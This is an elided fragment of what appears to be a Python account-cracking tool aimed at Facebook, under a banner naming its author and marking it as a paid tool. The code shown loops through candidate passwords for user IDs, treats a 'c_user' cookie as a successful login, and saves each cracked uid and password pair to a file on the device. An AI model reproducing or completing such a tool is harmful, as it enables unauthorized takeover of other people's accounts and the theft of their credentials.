...
▒█░▒█ ▒█▄▄█ ▒█░▒█ ▒█░░▒█ ▄█▄ ▒█░░▀█
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38mALAMIN MAHAMUD\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> Md. Alamin Islam     ║  \033[1;97m
╠══[Github:=======================> \33[1;38mAtalamin      ║\33[1;34m
╠══[TOOLS TYPE:=====================> PAID     ║\33[1;35m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SKB-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
